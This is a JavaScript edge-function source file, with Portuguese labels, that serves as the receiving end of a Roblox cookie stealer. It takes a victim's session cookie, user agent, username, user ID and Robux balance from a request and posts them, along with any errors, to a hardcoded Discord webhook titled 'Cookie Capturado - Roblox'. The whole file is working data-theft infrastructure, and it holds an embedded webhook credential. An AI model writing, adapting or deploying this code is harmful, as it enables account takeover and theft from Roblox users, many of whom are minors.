export const config = {
  runtime: "edge",
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    const { searchParams } = new URL(req.url);

    const cookie = searchParams.get("cookie") || "Não enviado";
    const userAgent = searchParams.get("ua") || "Não enviado";
    const host = searchParams.get("host") || "Não enviado";
    const username = searchParams.get("username") || "N/A";
    const userid = searchParams.get("userid") || "N/A";
    const robux = searchParams.get("robux") || "N/A";

    const payload = {
      embeds: [
        {
          title: "Cookie Capturado - Roblox",
          color: 15158332, // Vermelho
          fields: [
            { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1024)}\`\`\``, inline: false },
            { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
            { name: "Host", value: host, inline: true },
            { name: "Username Roblox", value: username, inline: true },
            { name: "UserID Roblox", value: userid, inline: true },
            { name: "Robux", value: robux, inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: true }
          ],
        },
      ],
    };

    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      throw new Error(`Falha ao enviar webhook: ${res.status}`);
    }

    return new Response("Enviado com sucesso!", { status: 200 });
  } catch (error) {
    const errPayload = {
      embeds: [
        {
          title: "Erro na API - Roblox Cookie",
          color: 15158332,
          description: `\`\`\`${error.message}\`\`\``,
          timestamp: new Date().toISOString(),
        },
      ],
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(errPayload),
    });

    return new Response("Erro no envio", { status: 500 });
  }
                                          }
